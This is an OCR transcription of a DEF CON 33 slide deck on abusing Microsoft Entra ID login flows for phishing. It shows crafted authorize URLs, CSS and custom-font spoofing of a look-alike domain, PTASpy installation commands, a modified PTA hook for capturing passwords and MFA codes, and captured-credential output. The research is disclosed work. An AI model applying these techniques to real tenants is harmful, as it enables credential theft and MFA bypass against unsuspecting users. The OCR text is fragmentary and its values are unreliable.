---
title: "Turning Microsoft's Login Page into our Phishing Infrastructure"
speakers: ["Keanu Nys"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Keanu Nys - Turning Microsoft's Login Page into our Phishing Infrastructure.pdf"
pages: 97
sha256: "b4f9cb0214ffc74d87ffa5b6549f345ccc611cb38c345e768786e2fbcd84ec8e"
text_chars: 33568
ocr_pages: 89
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.9
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:06:03Z"
---
# Turning Microsoft's Login Page into our Phishing Infrastructure

**Speakers:** Keanu Nys  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Keanu Nys - Turning Microsoft's Login Page into our Phishing Infrastructure.pdf` (97 pages)


## Slide 1


> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
e
_DEF CON 33
“Turning Microsoft's Login Page
into our Phishing Infrastructure
Keanu Nys
```

## Slide 2


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Security R e Center
To: You + 3 others
Hi Keanu,
Thank you for reaching out and for sharing the context around your upcoming talk. We
ement with the ty community.
sment regarding s¢ we'd still encourage \
submit your findings to MSRC for review. Even if the niques don't meet servici
iteria or bounty eligibilit t Jaluable and help us strengthen our
```

## Slide 3


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Security Response Center “A G&
M
Aan: You + 4 others Do 10/07/2025 21:48
Your Invitation to the MSRC Black Hat Party! ‘ x Connect with MSRC in Las Vegas
MSRC Researcher Communications Hello,
MC
To: You
We saw that you’ll be speaking at DEF CON — congratulations! While
you're in Las Vegas, we would love to invite you to join the Microsoft
Security Response Center (MSRC) team for some food, drink, and
conversation about your experience working with us.
We’re thrilled to invite you to the MSRC Researcher Celebration at
Black Hat, our annual gathering which honors the incredible
achievements of our security research community.
This invite-only event is your opportunity to connect with MSRC We'll be at Libertine Social in Mandalay Bay on August 6-7, and we'd be
leadership and staff, and the broader security research community, all thrilled to connect with you there. Grab a time that works for you with
while enjoying great food, incredible views, and some special swag this link
that you won’t want to miss.
Here are the event details: Hope to see you there!
Location: Skyfall Panoramic Bar & Lounge, W Las Vegas
Date: Thursday, August 7, 2025 y Cheers,
Main event: 5:00 PM —- 9:00 PM PT MSRC Team
```

## Slide 4


> Recovered by OCR — confidence 75/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Welcome Microsoft ;) QO spotit
902
```

## Slide 5

-

-

-

-

-


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
e Keanu Nys
¢ Offensive Security Lead at Spotit (Belgium)
¢ Author of GraphSpy
¢ Instructor for Azure Red Teaming Bootcamps at Altered Security
```

## Slide 6

## Slide 7

-

-

-

-

-

-


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Challenges spotit
©
¢ Challenges with classic phishing attacks:
* Email Security Solutions could block emails with suspicious links
¢ User awareness focusses a lot on checking the domain
¢ Getting benign domain categorization can take some time
¢ Constantly recycle domains when they are burned
```

## Slide 8

•

→

•

→

•

→ →


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Alternatives Ospotit
@
¢ Illicit Consent Grant Attacks
> Requires Admin Approval + Verified Publisher Restrictions
¢ Device Code Phishing
> Still very effective, but could be blocked in hardened tenants
e Adversary in the Middle (AitM)
> Website looks convincing
> But URL could be suspicious (both for user & security solutions)
```

## Slide 9

•


> Recovered by OCR — confidence 82/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Research Goal
login.microsoftonline.com
HE Sign in to your account x) +
€ > C £5 login.microsoftonline.com/common/oauth2/v2.0/authorize?c....
ae
```

## Slide 10

-

-


> Recovered by OCR — confidence 83/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Research Goal
login.microsoftonline.com
HE Sign in to your account x + - o x
```

## Slide 11

## Slide 12

-

-

-

-

-


> Recovered by OCR — confidence 77/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Honourable Mentions: Open Redirects spotit
, OIDC - Prompt=None OIDC - Invalid Scope
```

## Slide 13


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Machine View Input Devices Help
File Actions Edit View Help
You've gone Incognito
Others who use this device won't see your activity, so you can browse more privately. This won't
change how data is collected by websites that you visit and the services that they use, including
Google. Downloads, bookmarks and reading list items will be saved. Learn more
Chromium won't save: Your activity might still be visible to:
* Your browsing history ‘* Websites that you visit
* Cookies and site data * Your employer or school
* Information entered in forms * Your Internet service provider
® Third-party cookies are blocked
When you're in Incognito mode, sites can't use third-party cookies. If a site that relies on
these cookies isn’t working, you can try giving that site temporary access to third-party
cookies.
e *Untitled 1- Mousepad
File Edit Search View Document Help
authorize?client_id=bbe32cca-
uri=https: //login. fake-microsoft.com/defcon-demo?
cun=189WPdphWP4MCGFAf z8yuVaEIogS6BW1s6ZBURLS7p2ny583LpF-
n3n64-
ytQww. onmicrosoft.com&prompt=Login&scope=invalid|
```

## Slide 14


> Recovered by OCR — confidence 77/100 on the text kept, 40/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
. Self-Service Sign Up
e
a
```

## Slide 15

-

-

-

-


> Recovered by OCR — confidence 92/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Custom attributes
guest account
£03 External Identities | External collaboration settings
) spotit
```

## Slide 16


> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
B2X_1_ TestFlow | User attributes
Sign up gn in (Recommended)
@= Manage user attributes i Got feedback?
User attributes are values collected on sign up. You can create custom attributes for use in your directory. Learn more
Settings
. . Name Data Type Description Attribute type
89. Identity providers
city String The city in which the user is locat... Built-in
User attributes
. " Country/Region String The country/region in which the ... Built-in
Customize Display Name String Display Name of the User, Built-in
Email Address String Email address of the user. Built-in
Use E Addres tring a 5 of th f ilt-it
Given Name String The user's given name (also kno.. Built-in
Job Title String The user's job title. Built-in
MFA Code Int Custom
Password String Custom
Postal Code String The postal code of the user's add... Built-in
State/Province String The state or province in user's ad.. Built-in
```

## Slide 17


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
m user attribu
+> All API connectors
```

## Slide 18


> Recovered by OCR — confidence 95/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Self-Service Sign Up — Attack Flow
@
User
1. User clicks on
crafted URL
Entra ID
v
. Legitimate sign in to account
& Accept Tenant Invite
3. Show attribute
collection page
API Connector
Repeat until
success
4. “Attributes” (password +
TOTP code) sent to API
Connector for input validation
v
6. Show custom input
validation message or
complete collection flow
5. Validate user
credentials
v
```

## Slide 19

→ →


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Self-Service Sign Up — Invite URL spotit
?client_id=<self-service-app-client-id>
&response_type=code&scope=openid
&login_hint=user@VictimOrg.com
&prompt=create
1. “prompt=create” + login_hint forces sign up page with pre-filled email -
2. User signs in with creds and needs to accept tenant invite | |
> This is not a consent prompt!
3. Custom attribute collection page shown oa
> Capture & validate creds with API Connector ——
```

## Slide 20


> Recovered by OCR — confidence 90/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
New Incognito tab x +
You've gone Incognito
Others who use this device won't see your activity, so you can browse more privately. This won't
change how data is collected by websites that you visit and the services that they use, including
Google. Downloads, bookmarks and reading list items will be saved. Learn more
Chromium won't save: Your activity might still be visible to:
* Your browsing history © Websites that you visit
* Cookies and site data * Your employer or school
* Information entered in forms * Your Internet service provider
® Third-party cookies are blocked
When you're in Incognito mode, sites can’
these cookies isn't working, you can try gi
ird-party cookies. If site that relies on
site temporary access to third-part
&
aad8-4950-862d-61b002cb25d4/oauth2/v2.0/authorize?
client_id=538bc5e4-16d6-4c23-b98c-8d238018f1a5
2Fmyaccount.microsoft.com&response_mode=query&scope=openi
d&state=12345&prompt=create&login_hint=pentesting5
@spotit.be
```

## Slide 21


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Create account
Enter the email you'd like to sign up with.
spotit
© pentesting5@spotit.be
Microsoft
pentesting5@spotit.be
Permissions requested by:
MSFT
ytOww.onmicrosoft.com
word
By accepting, you allow this organization to:
Vv Receive your profile data
Collect and log your activity
\v__ Use your profile data and activity data
You should only accept if you trust MSFT. MSFT has not provided
links to their terms for you to review. You can update these
permissions at https://myaccount.microsoft.com/organizations.
Learn more
This resource is not shared by Microsoft.
```

## Slide 22


> Recovered by OCR — confidence 96/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Microsoft
Add more details Add more details
The provided password is incorrect. Please try again
You can use this email to sign in next time.
You can use this email to sign in next time.
pentesting5@spotit.be
FakePassword
Cancel Continue Cancel
```

## Slide 23


> Recovered by OCR — confidence 81/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Received credentials!
Username: 'pentesting5@spotit.be'
Auth details saved to /opt/defcon/auth. json
Received OTP!
Username: "nentestings@spotit.be’ |
Add more details jOUR 399557]
Auth details saved to /opt/defcon/auth. json
Successfully got OAuth tokens!
Microsoft
You can use this email to sign in next time.
{"token type": "Bearer', 'scope': "‘Device.Read.All DeviceManagement
: : Configuration.Read.All DeviceManagementConfiguration.ReadWrite.All S
599557
instars Access request status SwiYWlvIjoiQV
INoWForN11603hH You have been pwned! Happy DEF CON! 1VFK3MrRj ZrZW
|85eXBHaDV1cndo IXTiOlsicHdkTi
RyNVFVUGtCUkx
Microsoft
Cancel Continue
```

## Slide 24

## Slide 25


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MSFT | Company branding
Getting started Def
Add browser language
spotit
```

## Slide 26


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
login.microsoftonline.com
WOODGROVE
Sign in
```

## Slide 27

-

-

-

-

- →


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Custom CSS
Custom CSS © Browse
CustomCssLoaderjs x
> Filtered with client-side JS “6
t-input .ext-text-box
ext-banner
```

## Slide 28


> Recovered by OCR — confidence 83/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Company Branding
var c_AllowedCssAtRules =
[
if (parsedNode.type === “function")
{
switch (parsedNode.value.toLowerCase())
{
return;
var c_DisallowedCssProperties =
[
“content",
"-o-link"
var c_AllowedCssCharactersRegex =
var c_AllowedCssPseudoSelectorRegex =
/*https:\/\//i;
var c_AllowedCssUr1SchemesRegex =
Custom CSS Filters
var c_AllowedCssSelectors =
[
13
"body",
a",
.ext-title",
.ext-subtitle",
.ext-error",
-ext-input.ext-text-
-ext-footer-content.
-ext-footer-content.
-ext-footer-content.
-ext-footer-content.
.ext-background-image",
.ext-background-overlay",
box",
-ext-boilerplate-text",
-ext-vertical-split-
main-section",
background",
ext-footer-item'
ext-footer-item
.ext-password-reset-links-container",
-ext-vertical-split-background-image-container",
-ext-middle",
ext-footer-item.
ext-footer-item.
ext-footer-item.
ext-footer-item.
ext-has-background.ext-background-always-visible",
ext-debug-item",
ext-debug-item.ext-has-background”,
ext-debug-item.ext-has-background.ext-background-always-visible”
```

## Slide 29


> Recovered by OCR — confidence 96/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Sign in
Microsoft
Sign in
Email, phor
display: none;
```

## Slide 30


> Recovered by OCR — confidence 95/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft Microsoft
Sign in Sign in
Self-service password reset
< Previous Next: Review >
```

## Slide 31


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
G 7
Microsoft
Microsoft
Sign in
a, a:link, a:visited {
padding: 6px 39px;
color: #fff;
border-color: #6067b8;
background-color: #@067b8;
font-size: 15px;
text-decoration: none;
}
a:hover, a:focus
{
border-color: #@75b9d;
background-color: #@75b9d;
```

## Slide 32


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
G
Microsoft Microsoft
Sign in
Sign in
a, a:link, a:visited {
padding: 6px 39px;
color: #ffFf;
border-color: #0067b8;
background-color: #0067b8;
font-size: 15px;
text-decoration: none;
position: relative;
left: 242px;
top: 88px;
a:hover, a:focus
border-color: #075b9d;
background-color: #075b9d;
```

## Slide 33

→


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Company Branding O spotit
?client_id=<some-client-id>
&response_type=code&scope=openid
&prompt=login
1. “prompt=login” forces showing sign-in page (even when already signed in): . . 7
2. User enters email address on legit domain, and clicks Next button
3. Redirects to malicious domain to capture credentials (e.g. EvilGinx) . - .
> Email address & company branding can be pre-filled here if spear-phishing single user. oe
```

## Slide 34


> Recovered by OCR — confidence 94/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
Sign in
satya@microsoft.com
Microsoft
< satya@microsoft.com
Enter password
```

## Slide 35

## Slide 36

## Slide 37

-

-

-

-

-


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass Through Authentication (PTA) OO spotit
¢ One of the methods to sign-in to cloud apps with on-prem credentials
e Entra ID literally forwards the password to an on-prem agent which
decrypts it to clear-text for validation against the Domain Controller
e Well-known post-compromise/persistence attack technique:
¢ Backdoor PTA agent to extract cleartext credentials
e Usually done after full domain compromise, due to high privilege requirements.
```

## Slide 38


> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
User tries to
access app
If successful,
user gets
access to app
Azure AD for sign-in .,.«* :
00 eooee’ rae Active Directory Username &
weet Lae placed on a queue
User enters soon’
username & weooene
completes the
sign-in process
On-premises agent s
picks up the request ¢
from the queue Q
Agent decrypts password «*
using its private key
Pass-through
authentication agent
On
Agent returns
response to Azure AD
Active Directory
returns result to agent
Agent validates
username & password
against Active Directory
Windows Server
MM Active Directory
```

## Slide 39

-

-

-

- →


> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Abusing PTA for Initial Access )spotit
@
¢ New idea:
* Can PTA be used for phishing clear-text credentials?
e Plan:
1. Set up PTA in an attacker tenant
2. Backdoor the PTA agent
3. Trick users into signing in to our tenant with their password
> Easier said than done!
```

## Slide 40


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a Microsoft Entra Connect Sync
Microsoft Entra
Sync
Conn
Microsof
Domain/OU Filtering
dentifyin
Filtering
User sign-in
Select the Sign On method. 2]
Password Hash Synchronization (2)
®) Pass-through authentication 2]
Federation with AD FS e
Federation with PingFederate (2)
Do not configure 2]
Select this option to enable single sign-on for your corp
(Enable single sign-on @
We recommend that you have a cloud only Hybrid
Administrator account so that you are able to mar
of an on-premises failure. Learn more
Domain/OU
Identify
Filtering
Optional
Configure
Microsoft Entra sign-in configuration
To sign-in to Azure with the same credentials as your on-premises directory, a matching Microsoft Entra
ID Domain is required. The following table lists the UPN suffixes for your on-premises environment and
the status of the associated Microsoft Entra Domain. G
Active Directory UPN Suffix Microsoft Entra ID
Domain
redbyte.local Not Added (?)
Select the on-premises attribute to use as the Microsoft Entra ID username
USER PRINCIPAL NAME @
userPrincipalName
[¥] Continue without matching all UPN suffixes to verified domains
Users will not be able to sign-in to Microsoft Entra ID with on-premises credentials if the UPN
suffix does not match a verified domain. Learn more
```

## Slide 41


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passthrough Authentication
Download
We recommend that you have a minimum of 3 authentication agents running on your tenant.
eam more
Authentication Agent Status
dc-01.redbyte.local
```

## Slide 42

-

•


> Recovered by OCR — confidence 90/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2. Backdoor the PTA Agent spotit
¢ For example: PTASpy from AADInternals (by DrAzureAD)
Ips C:\Windows\system32> Import-Module AADInternals
v@.9.3 by @DrAzureAD (Nestori Syynimaa)
PS C:\Windows\system32> Install-AADIntPTASpy
RNING: Microsoft Visual C++ 2015 Redistributable (x64) seems not to be installed! If PTASpy installation fails,
install from: https://download.microsoft .com/download/6/A/A/6AA4EDFF -645B-48C5-81CC- ED5963AEAD48/vc_redist.x64.exe
JAre you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort: YES
Installation successfully completed!
1l passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
PS C:\Windows\system32> Get-AADIntPTASpyLog
¢ Testing:
PS C:\Windows\system32> Get-AADIntPTASpyLog -DecodePasswords
UserName Password Time
SyncedUserl1@yt@ww.onmicrosoft.com R34dyT@Sync:) 5/4/2625 8:21:15 AM
```

## Slide 43

•


> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
5. Trick users into signing in to our tenant Ospotit
¢ Constraints:
1. Wecan only target users existing in our own tenant.
2. PTA only works for hybrid identities (i.e. On-prem user synced to cloud)
3. Guest accounts can not be synced
```

## Slide 44

•

•


> Recovered by OCR — confidence 95/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“oroxy addresses”
a
Email as an alternate login ID
soft Entra
to Microsoft Entra ID with any of their proxy
in addition to UPN.
The option below controls the tenant-wide feature
```

## Slide 45

•

-


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
cloud-only user
email nonsynced@microsoft.com
proxy address
Non Synced
Last name
User principal name
Object ID
Identities
User type Member
Creation type
Created date time
Last password change date time 4N
Invitation state
State or province
[| ZIP or postal code
hl Country or region
Business phone
Mobile phone
Email
Other emails
Proxy addres
Fax number
```

## Slide 46

•


> Recovered by OCR — confidence 91/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Microsoft
< nonsynced@microsoft.com
Enter password
```

## Slide 47

•


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
G
Synced User1
Y Got feedb
Last name se State or province
User principal name s se Ww. osoft.com ZIP or postal code
Object ID 6: 273 c1- 9 c 2a... Country or region
Identities t . cros om Business phone
User type Member Mobile phone
Creation type Email
Created date time V 53 Other emails
Last password change date time M 25 Proxy addresses : Jse nmicrosoft.com
Invitation state Fax number
Therefore, the values of the Mail and ProxyAddresses attributes for the object in Active Directory may not be the
same as the values of the ProxyAddresses attribute in Microsoft Entra ID.
```

## Slide 48

-

-

-


> Recovered by OCR — confidence 73/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
var c_AllowedCssSelectors =
¢ Can we somehow modify the email ‘ ..4.,
address with CSS? es
¢ Nota single allowed selector can "-ext-title”,
¢ Closest is complete sign-in-box, (aaa
but pseudo-selectors like nth-child eran,
".ext-footer",
".ext-footer-content .ext-footer-item",
13
```

## Slide 49

-

-


> Recovered by OCR — confidence 87/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@font-face (J) spotit
var c_AllowedCssAtRules =
[
e Custom fonts can be defined with @font-face "font-face",
1;
var c_AllowedCssSelectors =
[
"body" >
"a",
¢ Font can be applied to whole body
```

## Slide 50


> Recovered by OCR — confidence 86/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Edit Element Hints Encoding View Metrics CID ae mae
a
File Edit Point Element Hints View Metrics Window Help
] /hyphen]
v
Active Layer: Fore
```

## Slide 51

→


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
micro-oft.com > microsoft.com
Custom domain names
Domain Sen
YY Add filter
ive problems
Name Status
```

## Slide 52


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Basic info
admin@micro-oft.com
User principal name
Object ID
Created date time
User type
nber
admin@micro-oft
64a00273-b8c1-4
4 May 2025
09:53
Member
Home
[li] Delete © View policy information
Assignments
Users ©
Specific users included
Target resources ©
All resources (formerly
Network NEW
Not configured
Conditional Access | Policies >
O’ View policy impact
C) All users
@) Select users and groups
| Guest or external users ©
[J Directory roles ©
Users and groups
Select
Conditions @
0 conditions selected
Access controls
Grant ©
Block access
Synced User1
admin@micro-oft.com
```

## Slide 53


> Recovered by OCR — confidence 74/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@font-face { font-family: ‘customfont"; src:
font-family: "customfont },"Segoe UL 4
t Yi Baiti","Mongolian Baiti”,"MV Boli'
}
sole
Microsoft
Enter password
Lighthouse Recorder Ad
Sources Network Performance Memory Application Privacy and sec
<div id="displayName" class="identity” data-bind="text: u if } direction
» display
» font-family
```

## Slide 54


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass Through Authentication + Custom Font spotit
@
https://login.microsoftonline.com/
?login_hint=admin@micro-oft.com
Or obfuscate/encode any part of the URL:
https://login.microsoftonline.com/
?login_hint=admin@micro%2doft.com
https://login.microsoftonline.com/
?random-parameters=are-ignored
```

## Slide 55

## Slide 56

•


> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¢ Several issues with this approach:
1. A wrong password can be entered (PTASpy always returns successful auth)
2. Cleartext password is useless when MFA is enforced
```

## Slide 57


> Recovered by OCR — confidence 79/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
) spotit
@font-face { font-family: ‘customfont"; src: url("https:// /test_font/dash-to-s2.woff2');]Junicode-range: U+902D;}
body {
font-family: 'customfont},"Segoe UI Webfont", -apple-system,”"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Ga
avi","Iskoola Pota”,"Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Micro
t Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text", "Cambria Math";
at
display: none;
Microsoft
admin@microsoft.co
color: transparent;
user-select: none;
height: 85px;
width: 34@px;
background-image: url("https:// /images/title-image. png?v=123") ;
background-repeat: no-repeat;
```

## Slide 58


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
adminG@
Enter password
Enter password
nt rememb
If you don't remember your password, reset it now.
Enter code
n the authenticator
```

## Slide 59


> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Modified PTASpy.dll (preview) CO) spotit
BOOL LogonUserWHook(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD LogonType, DWORD LogonProvider, PHANDLE hToken) {
// Validate credentials before sending message
std::string usernameStr = LtoString(username) ;
std::string passwordStr = LtoString(password);
authSuccess = validateCredentials(usernameStr, passwordStr);
// Check if password is a 6-digit number
bool isOTP = false;
if (password.length() == 6) {
isOTP = true;
for (char c : password) {
ah eee ae, S // If validation failed, set error code for invalid credentials and return FALSE
isoTP = false; if (!authSuccess) {
break; SetLastError(ERROR_LOGON FAILURE); // Standard error for invalid credentials
} return FALSE;
} }
} return TRUE;
```

## Slide 60

→
→
→
→


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Double PTA Auth for TOTP Capture )spotit
Attacker Web Server User 4. User clicks on crafted Entra ID PTA Server
URL to login page
2. Request image.png <
Return: password-prompt
3. User enters password -
Forwarded to PTA Server
v
Enter password
v
4. Validate password
against Entra ID
5.1 Password incorrect? > ERROR_LOGON_FAILURE
5.2 Password correct? > SUCCESS
' Success | ; Success |
Pe 6. Redirect to login page —=__—_——err——
7. Request image.png < > |
Return: mfa-code-prompt
< > 8. User enters MFA code in password field
Forwarded to PTA Server
Enter code >»
against Entra ID
5.1 MFA incorrect? > ERROR-LOGON FAILURE
9 @ 5.2 MFA correct? > SUCGESS
```

## Slide 61


> Recovered by OCR — confidence 83/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Double PTA Auth for TOTP Capture )spotit
https://Login.microsoftonline.com/common/oauth2/v2.9/authorize
&scope=.default&response_type=code
&prompt=login&login_hint=admin@micro-oft.com
a3aa%26redirect_uri%3Dhttps%253A%252F%252Fgoogle.com%26scope%3D.de °
```

## Slide 62

-

-


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@micro-oft.com to @microsoft.com
@microsoft.com
Microsoft Security ponse Center
M
To: You + 3 others
Hi Keanu-
Thank you for the additional context and for your continued engagement.
At this time, we're unable to accommodate the request for an account with
the @microsoft.com domain. We understand this may impact how you plan
to present your findings, and we appreciate your transparency around the
constraints.
That said, we still encourage you to submit the vulnerability through our
standard annels. Even without the specifi ) setup, we're able to
test account
```

## Slide 63


> Recovered by OCR — confidence 73/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PS C:\Windows\system32>
ce google.com bg o ® Incognito
About Store Gmail Images
Google Search 'm Feeling Lucky
Google offered in: Nederlands Francais Deutsch
Belgium
Advertising Business __ How Search works Privacy Terms _ Settings
lw
```

## Slide 64


> Recovered by OCR — confidence 95/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1. User needs to enter TOTP code into a Password field
2. Authenticator App Notifications are more common/convenient
```

## Slide 65


> Recovered by OCR — confidence 92/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
-ext-sign-in-box {
@font-face { font-famil "customfont'; src: url("https:// /test_font/dash-to-s2.woff2');
display: none;
customfont
ily
display: none;
-ext-middle
background-image: url(“https://| /images/alternating-image-mfa. png
background-repeat: no-repeat;
Microsoft
ition: center;
background-p
min@microsoft.com
Microsoft
Enter password Approve sign in request
Open your Authenticator app, and enter the
number shown to sign in.
00
Didn't receive a sign-in request? Swipe down to
refresh the content in your app.
```

## Slide 66


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Approve sign in req}
6
49
Approve sign in req}
Approve sign in req}
mfa_authenticator_65.png
Approve sign in reque:
Approve sign in request
6
mfa_authenticator_58.png
Approve sign in request
mfa_authenticator_66.png
Approve sign in request
74
Approve sign in requi Approve sign in r
6 6
51 52
Approve sign in request Approve sign in requi
59
Approve sign in request
67
Approve sign in request Approve sign in request
76
Approve
6
mfa_authenticator_53.png
Approve sign in request
mfa_authenticator_61.png
Approve sign in reques
6
mfa_authenticator_69.png
Approve sign in reques
spotit
```

## Slide 67

→
→


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PTA + Mobile App MFA O spotit
@
Attacker Web Server User 1. User clicks on crafted URL Entra ID PTA Server
to login page of Tenant 1
2. User enters password -
Forwarded to PTA Server
3. Validate password
against Entra ID
Approve sign in request <
42 5.1 Password incorrect? >
5.2 Password correct? > SUCCESS
| Code: 42 | | Code: 42 ;
6. Redirect URL redirects to
login page of Tenant 2 .
: : > Repeat until success
7. Request image.png
Return: 2-digit-number
< > 9. Poll Entra ID for
MFA status
90 Cookies + Access Token
peat Authenticator A >
Pp
```

## Slide 68


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eS New Incognito tab x +
GQ Search Google or type a URL * 8 c & Incognito
ink SSH-in-browser @ UPLOADFILE % DOWNLOADFILE J GY x
root@debian-phishing: /opt/defcont# | |
You've gone Incognito
Others who use this device won't see your activity, so you can browse more privately. This won't
change how data is collected by websites that you visit and the services ey use, including
Google. Downloads, bookmarks and reading list items will be saved. Lea
Chromium won't save: Your activity might still be visible to:
* Your browsing history © Websites that you visit
* Cookies and site data * Your employer or school
* Information entered in forms * Your Internet service provider
® Third-party cookies are blocked
When you're in Incognito mode, sites can't use t
th \kies isn't working, you can try giving th:
@/authorize?client_id=886b3d9c -8f17-421b-a666-
2Flogin.microsoftonline.com%2F%3Fwhr%
oft.com
Ln, Col 282 281 characters A Formatted 270% Windows (CRLF) UTF-8
```

## Slide 69


